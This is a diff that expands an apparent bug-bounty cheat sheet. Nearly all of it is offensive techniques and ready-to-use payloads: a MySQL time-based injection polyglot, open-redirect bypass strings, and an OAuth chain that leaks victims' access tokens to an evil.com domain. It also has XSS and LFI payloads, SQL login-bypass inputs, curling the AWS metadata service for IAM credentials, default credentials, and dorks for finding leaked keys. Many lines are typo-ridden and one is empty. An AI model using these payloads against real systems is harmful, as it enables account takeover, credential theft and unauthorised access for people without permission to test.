@@ -1,7 +1,188 @@
 - Any expired reset password link can still be used to reset the password.
 - Ultimate MySQL Injection Payload (Detetify)
 IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+- if file.php?url=/admin/ redirects to https://website.com/admin/, Put URL file.php?url=@google.com, now it is website.com@google.com which redirects to http://google.com
+- in some cases you can have open redirect using %0d%0a and two "/" directly on the main url: http://victim//%0d%0ahttp://google.com
+- try to change protocol to bypass open redirect protection, from http://target.com to ftp://target.com
+- http:sitetoredirect,http%3asitetoredirect,http%253asitetoredirect mostly works, for open redirect bugs
+- Always check the content of a redirect page(302,301), espcially if it requires authentication, and remember, a redirection page is a good place to test for crlf and open redirection.
+- for open redirect, try using the character: °, the website thinks it's redirecting to a page on the site but browsers converts it to a dot ".", thus completing the redirect. Usage: ?url=//google° com becomes google.com, url encoded: %E3%80%82
+- "%0d/domain_address" is one of the best bypasses in account takeover stealing tokens.
+- when parameter value is prefixed in location header:
+	http://victim.com?url=//attacker.com -- > Location: //attacker.com-foobar
+	http://victim.com?url=//attacker.com/? -- > Location: //attacker.com/?-foobar
+	always add slash at the end of the payload
+- when you find xss in open redirection in signon/in pages, just capture the credentials and hijack them.
+- Open Redirect Bypass: /path?redirect=//2130706433 or /path?redirect=//0x7f000001 It will redirect you to 127.0.0.1
+- bypass most filters with this payload: http:http:evil[.]com http:/evil%252ecom ///www.x.com@evil.com
+- use the chinese dot instead of the regular dot to bypass open redirect and ssrf protection, "%E3%80%82", poc: ?redirect=////evil%3E%80%82com
+- most sites usually redirect the user after some type of action such as logging in, logging out, password change, signup. The parameter can usually be found in the URL, or sometimes you need to hunt in .js files for referenced parameters. It is highly likely that the login page will handle some type of redirect parameter so make sure to look deeply!. Once you have discovered one parameter name used for redirecting then typically developers will re-use code/parameter names throughout so test this parameter on every endpoint you discover. 
+- When authenticating on certain websites they will use an Oauth flow which will look like: https://www.example.com/oauth?client_id=123&scope=email&response_type=code&return_uri=https://www.example.com/callback. The way this works is when you authenticate it will return to https://www.example.com/callback along with a ?CODE=, defined in response_type=code.. Changing this to token= will result in #access_token=. The way it works and the parameter names may vary.
+- To put it simply, you want to be able to leak a users access_token so you can become them. When authenticating via oauth the final destination with the token is handled by return_uri= (the parameter may vary!), so if you are able to redirect to a site you control, you will be able to leak the token.
+- Most Oauth setups will whitelist *.theirdomain.com/*, however thank to our open redirect we can send the user to the following: https://www.example.com/oauth?client_id=123&scope=email&response_type=token&return_uri=https://www.example.com/redirect%3Fgoto=//evil.com. In most cases adding response_type=token is important on most oauth web applications as the hash fragment is smuggled in the redirect, and it's usually a working access token. code= typically has to be "exchanged" for an access_token which will happen elsewhere. So with that said, what will happen is:
+	- The user will authenticate and the token will be generated.
+	- The web application redirects to https://www.example.com/redirect%3Fgoto=//evil.com#access_token=123
+	- The web application redirects to //evil.com#access_token123
+	- As you can see, we used the open redirect to "smuggle" the users token to our address. One of the most common issues researchers run into when testing login flows chained with an open url redirect is not testing encoding the values correctly and the redirect fails. For example if your redirect looked like, https://www.example.com/oauth?client_id=123&scope=email&response_type=code&return_uri=https://www.example.com/redirect?goto=//evil.com&thisisneeded=test. The extra parameter is needed for the redirect to work, so always try encoding:
+
+	- https%3A%2F%2Fwww.example.com%2Fredirect%3Fgoto%3D%2F%2Fevil.com%26thisisneeded%3Dtest
+	- Sometimes your flow may need to redirect twice, so you can try double encoding on the FINAL URL. The reason for this is because on first redirection it will be url encoded once, then again on the second. If it's already fully url decoded on the first then it may fail.
+
+	- https%3A%2F%2Fexample.com%2F%3Freturnurl%3Dhttps%253A%252F%252Fwww.google.com%252Fredirect%253Fgo%253D%252F%252Fevil
+
+- Imagine you have an endpoint which takes an ?url= parameter but it will only allow you to input local endpoints, such as /example. Now imagine you also have an open redirect at /redirect?goto=//127.0.0.1/. Pointing ?url= to this endpoint may cause their web application to trust the user input (since it is pointing to local endpoint), but process the redirect & show you sensitive information. Remember this is a redirect from their domain which means you have level of trust via their domain (think if you need the Referrer header to contain their domain, now you can)
+- When looking for these types of XSS vulnerabilities (via redirect), always look for strings such as window.location, top.location.href, location.. If you see a redirect via these methods then you will be able to achieve XSS as long as no filtering is stopping you.
+- Common bypasses for open-redirect:
+    \/yoururl.com
+    \/\/yoururl.com
+    \\yoururl.com
+    //yoururl.com
+    //theirsite@yoursite.com
+    /\/yoursite.com
+    https://yoursite.com%3F.theirsite.com/
+    https://yoursite.com%2523.theirsite.com/
+    https://yoursite?c=.theirsite.com/
+    https://yoursite.com#.theirsite.com/
+    https://yoursite.com\.thersite.com/
+    //%2F/yoursite.com
+    ////yoursite.com
+    https://theirsite.computer/
+
+    This is when .domain.com* is whitelisted and you can use .computer domain!:
+
+    https://theirsite.com.mysite.com
+    /%0D/yoursite.com (Also try %09, %00, %0a, %07)
+    java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
+    java%07script:prompt`0` java%09scrip%07t:prompt`0`
+    /%2F/yoururl.com
+    /%5Cyoururl.com
+    //google%E3%80%82com
+- Using a whitelisted domain or keyword: www.whitelisted.com.evil.com redirect to evil.com
+- Using CRLF to bypass "javascript" blacklisted keyword: java%0d%0ascript%0d%0a:alert(0)
+- Using "//" & "////" to bypass "http" blacklisted keyword: //google.com, ////google.com
+- Using "https:" to bypass "//" blacklisted keyword: https:google.com
+- Using "//" to bypass "//" blacklisted keyword (Browsers see // as //): \/\/google.com/, /\/google.com/
+- Using "%E3%80%82" to bypass "." blacklisted character: /?redir=google。com, //google%E3%80%82com
+- Using null byte "%00" to bypass blacklist filter: //google%00.com
+- Using parameter pollution: ?next=whitelisted.com&next=google.com
+- Using "@" character, browser will redirect to anything after the "@": http://www.theirsite.com@yoursite.com/
+- Creating folder as their domain:
+		http://www.yoursite.com/http://www.theirsite.com/
+		http://www.yoursite.com/folder/www.folder.com
+- Using "?" characted, browser will translate it to "/?":
+		http://www.yoursite.com?http://www.theirsite.com/
+		http://www.yoursite.com?folder/www.folder.com
+- Host/Split Unicode Normalization:
+		https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
+		http://a.com／X.b.com
+- XSS from Open URL - If it's in a JS variable: ";alert(0);//
+- XSS from data:// wrapper: http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
+- XSS from javascript:// wrapper: http://www.example.com/redirect.php?url=javascript:prompt(1)
+- Functionalities usually associated with redirects: Login, Logout, Register & Password reset pages, Change site language, Links in emails. Read JavaScript code
+- Responses to look for when fuzzing for open-redirect:
+        300 Multiple Choices
+        301 Moved Permanently
+        302 Found
+        303 See Other
+        304 Not Modified
+        305 Use Proxy
+        307 Temporary Redirect
+        308 Permanent Redirect
+- Try using the same parameter twice: ?next=whitelisted.com&next=google.com
+- If periods filtered, use an IPv4 address in decimal notation http://www.geektools.com/geektools-cgi/ipconv.cgi
+- Try a double-URL and triple-URL encoded version of payloads
+- Try redirecting to an IP address (instead of a domain) using different notations: IPv6, IPv4 in decimal, hex or octal
+- For XSS, try replacing alert(1) with prompt(1) & confirm(1)
+- If extension checked, try ?image_url={payload}/.jpg
+- Try target.com/?redirect_url=.uk (or [any_param]=.uk). If it redirects to target.com.uk, then it’s vulnerable! target.com.uk and target.com are different domains.
+- Use /U+e280 RIGHT-TO-LEFT OVERRIDE: https://whitelisted.com@%E2%80%AE@moc.elgoog
+- The unicode character U+202E changes all subsequent text to be right-to-left
+- Always use paramater pollution in open-redirection (login and signup especially)
+- check for an Open-Redirect that’s based On Path-URI and I found that’s website is vulnerable to it WOAH! :
+https://www.target01.com//mahdi.com/ It will Redirect you to //mahdi.com/, and because the filter accept any path with Valid Host I Can use that open redirect to steal token: Proof Of Concept: 
+	https://www.target01.com/api/OAUTH/?next=https://www.target01.com//mahdi.com/> https://www.target01.com//mahdi.com/?token =xxx&email=xx...> https://mahdi.com/?token=xxx&email=xx..
+- Bypass the OAUTH Protection Via [%09]:
+- Bypass the OAUTH Protection Via [Double encode for (.) %252E]:
+- Account Takeover Through Bypass the Filter with [%5b]:
+- Fuzz for whitelist with ffuf
+- the state parameter for login.uber.com contained a redirect location instead of a CSRF token. As a result, an attacker could modify the state parameter to have a poisoned central.uber.com path which would redirect to a custom domain after login and allow them to steal an account OAuth access token.
+- Referer headers are a common way of determining the user’s original location, since they contain the URL that linked to the current page. Thus, some sites will redirect to the page’s referer URL automatically after certain user actions, like login or logout. In this case, attackers can host a site that links to the victim site to set the referer header of the request, using HTML like the following: <html>  <a href="https://example.com/login">Click here to log in to example.com</a></html>. When a user clicks the link, they’ll be redirected to the location specified by the href attribute of the <a> tag, which is h t t p s ://example.com/login in this example. If example.com uses a referer-based redirect system, the user’s browser would redirect to the attacker’s site after the user visits example.com, because the browser visited example.com via the attacker’s page.
+- After-Login Open Redirect 
+- Encountered AWS WAF? Just add <! before any payload and you should bypass the waf, example "<!alert(1)"
+- when testing cloud environement, look for cloud_metadata.txt. it contains a list of urls to their internal metadata services.
+- kibana will return a content length of 217 if it is publicly open and one can access the dashboard without authentication.
+- in a cloud test, if you found a .cspkg file it's gold, it's a zip file with all compiled code and config files.
+- search for publi trello boards of companies, chances you find login creds and api keys, if not n you could find team boards and copmanies.
+- Want to find employeess of a company on github, use this "CompanyName" & type=user.
+- if you want to know the name of inside-site aws3 bucket, just put %c0 into url.
+- found an s3 bucket behind a cdn and can't get the name? change to https and if the response was the same then the bucket name should be the same as hostname.
+- look for public google groups of ur target.(groups.google.com/a/companyname.com)
+- use intelx.io and inteltechniques.com/menu (record of all pastebins, even removed ones)
+- use pastebin.com
+- use ideone.com
+- search copyright string on google to find other website owned by the target, intext: Example.inc"
+- compnaies leave their log instances exposed to public, dork: inurl:app/kibana
+- forget the subdomain for recon, go for the asn asn and hit the network range organisation, a new world arrises without wafs, a lot of messy ssl certs and unprotected hosts and hidden scopes.
+- look for port 2181, check if you are able to subit commands, as there is no auth in place by default in zoo keeper installations.
+- if shodan query "ssl:<domain>" doesn't give result try "http://ssl.cert.subject.CN:<domain>"
+- port 9090 tcp could be zeus admin panel or could be any other like prometheus, if that's the case you could get running nodes and hostnames.
+- default creds to always try: admin:admin, test:test, admin:password, admin:pass, test@test.com:test, test@company.com:test
+- when you sign up for a website/email/newsletter/reset pasword, check for the website that hosts the images and logos, in the email u receive, this could u lead to insecure aws3 buckets and scope expansion.
+- use this dork to find btbucket repo: intitle:" about atlassion bitbucket"
+- copy the copyight in ur target and search it in google,"2020 uber", change the years to previous years, you'll find previous forgotten assets.
+- look for google analytics tracking ID, and use https://dnslytics.com/reverse-analytics to discover more assets sharing the same id.
+- find subdomains not using https: "http://target.com" - https://
+- site: ideone.com | site: codebeautify.org | site:codeshare.io | site:codepen.io | site: repl.it | site: justpaste.it | site: pastebin.com | site: jsfiddle.net | site: trello.com
+- one way to reliably bruteforce subdomains: cat /usr/share/seclists/DNS/Discovery/jhaddix.txt | subgen -d domain.com | zdns --nameserver 1.1.1.1 --threads 500 | jq -r "(.data.answers[0].name) | .name"
+- if you're playing with an api endpoint, always try to send invalid content-type, you might end up by getting hidden endpoints in the response.
+- /api/something --> 400, /api/something?filter=all --> 200
+- If you are testing a JSON endpoint, always try to change one letter in the parameter names to make them invalid. I had quite a few cases where the server thrown back an error with all of the accepted parameters
+- Leak PII sensitive API Users DATA with URL Path Permutations: /api/users/user@email.com -> /api/users/..%2Fuser@email.com or /api/account/123/ -> /api/account/..%2F..%2F123
+- Saw a call to api/v3/login? Check if api/v1/login exists as well. It might be more vulnerable.
+- Never assume there’s only one way to authenticate to an API! Modern apps have many API endpoints for AuthN: /api/mobile/login | /api/v3/login | /api/magic_link; etc.. Find and test all of them for AuthN problems.
+- Even if the ID is GUID or non-numeric, try to send a numeric value. For example: /?user_id=111 instead of user_id=inon@traceable.ai Sometimes the AuthZ mechanism supports both and it's easier the brute force numbers.
+- if they fixed csrf by checking the origin header value, firefox doesn't set the origin header when iframing data:text/html;base64 
+- if you see an action being completed in the url, without any csrf token, check if you can post an image on the website or even set your avatar to a remote url, then make it the url of the action, whoever views the image will execute the action
+- bypass csrf by setting csrf value to "undefined"
+- change single character in csrf token to bypass
+- Supply an empty array on the CSRF token parameter.
+- Always do directory Brute forcing on all sub-domain even on 403 page. Sometimes you will get .git file and you can download whole web application source code.
+- make sure to fuzz on wbsites that immediatly redirects to another host
+- found a 403/401 , basic auth o interrestingn locked down domain, look at its archive/web entries, sometimes you win instatnely with api keys and or url structure that leads to unprotected content.
+- drop an array in parameters for full path disclosures
+- if you run into an empty api subdomain, hit /swagger-ui.html or any other swagger endpoint.
+- if you're out of luck with swagger, try: GET application.wadl, GET application.wadl?detail=false (or true), or try OPTIONS api/v1/ ..etc
+- sometimes you find thoses pages that forwards to a login page & you can't see the content inside them (ex: /path/to/secret->Google Login) take all these paths and prepend /public/ to all of them
+- always check for https://sites.google.com/a/company.net/sites/system/app/pages/meta/dashboard/categories
+- if http response contains some sensitive detaims such as passwords, check for these headers,Cache-Control: no-cache,no-store,must-revalidate. Pragma:no-cache
+- look for developpers of organization(linkedin..), search them on github, look for public reposs that shouldn't be public.
+- /WEB-INF/web.xml --> 403 ...... /./WEB-INF/web.xml -->403 ....... /.//WEB-INF/web.xml --> 200 OK
+- use repl.it for internal code , site:repl.it intext:companyname.com, also use codegist.net
+- do recon on storage.googleapis.com/companyname .. for internal documentation
+- sometimes you can find .sql files in /wp-content/ or /wp-content/vagrant/
+- leak PII sensitive API User with url permutation.
+- most java web apps allows lfi bypass by just using this ..;/..;/
+-  Github => "company name" language:python/bash send_keys
+- Github=> "company name" language:powershell pwd => working creds => unauthorized access
+- while testing file upload forms on IIS7 servers, you can use .cer files instead of .asp nd get RCE
+- if you find 403, try X-Original-Url and X-Rewrite-Url (both set to 403 endpoint)
+- always read jquery.js files as well, sometimes you end up finding creds for 3rd party.
+- site/file.php --> nothing, site/file.php~ --> source code
+- try an OPTION requets on the api root to see available endpoints
+- use blind xss as a password
+- use security trails to bypass firewals and find originating IP
+- use round brackets to inject sql,xss,rce payloads in a valid email: ypurname({}$<>'/*)@email.com'
+- ty to recover data from delted accounts by signing up with the old account
+- if you see an api endpoint displaying sensitive data, try to add jsonp or callback parameter and try to leak it using xss
+- put bxss and bsqli in X-Forwarded-For header
+- look inside aPKs for juicy endpoints, just use apktool -d and grep -r 
+- check if you can autofill html forms from urls with xss payloads.
+- try endpoint bruteforcing on the login page to discover hidden or legacy oauth providers (/oauth/facebook, /oauth/twitter..)
+- also inject payloads(xss) in the paramter name
+- if you need to uuid for a specific user, just try and register with his username, the response shoudl;d tell you the uuid and user already exsits.
 - First of all, get to know your application, spend some time on using it normally but keep burp open
+- file.js?v=kjsqfhmd&skin=lfi payload
+- url.com/lib///....//....//....//....//....//....//....//....//etc/passwd!
 - Start with XSS and SSTI as early as possible if in scope, insert them into every field you se
 - Create your own fuzzing lists
 - Expand this list with your own findings
@@ -89,7 +270,7 @@ http://evil.org/%00
 - Any expired reset password link can still be used to reset the password
 - use shodan for passive ports scan
 - HTTP request smuggling vulnerability in Apache HTTP Server 2.4.52 and earlier (CVE-2022-22720)
-exposed gitlab repos
+- exposed gitlab repos
 - firebase credentials leak(always check source code and when you find firebase mentionned look for key and database url)
 - try to enable 2FA authentication without email verification
 - bruteforece not logging failed attempts
@@ -156,6 +337,22 @@ exposed gitlab repos
 - Register as company mail, intercept the response and change 401 unauthorized to 302 Found-->success
 - xml files could contain creds (change request method)
 - do recon on gitlab
+- you can bypass cloudflare WAF by finding the real IP of the origin server and enter your payload there.
+- if you find a dead  bucket, but no domain that serves it. Do look at the csp header directives. They usually remain unchanged and at times, the scripts too are present. Leverage this, or run custom attacks wrt the directive that whitelists the bucket.
+- You can use the Burpsuite CO2 SQLMapper plugin to automatically generate and pass all params to @commixproject or @sqlmap!
+- search for informative, n/a, duplicate, low severity issues on programs managed and protected by h1, you have nice 30%+ bypasses or not complete fixes.
+- When you are re-testing a fixed IDOR, try again with the same requests/params but this time add an HPP attack. Most of the time you got a New Bypass which means a New Bounty
+- Always check the content of a Redirection Page (302/301). especially if it requires authentification. 
+And remember a Redirection Page is a good place to test issues like CRLF  injection and Open Redirection.
+- (Login Bypass): user: '-, pass: '
+- Are you able to control the src of an iframe, but Content-Security-Policy is set to: frame-src 'self' ? Load a 404 page from your site, make the 404 the page you want the victim to see.
+- even though the majority of the EC2 metadata API is disabled in AWS Glue Dev Endpoints, you can still retrieve temporary credentials for the attached role by curling "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+- login bypass: username: \ password: ||1#
+- X-Forwarded-For: 127.0.0.1: Server is like oh welcome localhost here is all my secrets.
+- GET /admin X-Forwarded-For: company IP --> 200 OK
+- in some case you find a company using F5 Big IP, & you have a lot of subdomains showing timeout like they don't serve any content. Hit the path /my.policy in all the non-working subdomains, if you get a response with content
+- if server only allows GET and POST method, then try adding "X-HTTP-Method -Override: PUT to achieve RCE via PUT method
+-  
 - github repo takeover (check is the site is pointing to a not found old github repo, you can recreate the repo with same name and takeover)
 - try this http://0.0.0.0/administrator/dashboard. to achieve ssrf
 - check for HTMLi in comment sections, if achieved you can escalate to csrf and account takeover
@@ -791,6 +988,8 @@ If you see file without any slash at end then do these acts there
 - Ask for two password reset link and use the older one from user's email
 - Check if active session gets destroyed upon changing the password or not?
 - Weak password reset implementation -Password reset token sent over HTTP
+- setting a user's name to an XSS payload
+- Clicking on external links within the reset password page leaked password reset token in the referer header.
 - Send continuous forget password requests so that it may send sequential tokens
 - Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks?
 - Does it allow to upload file on the server?
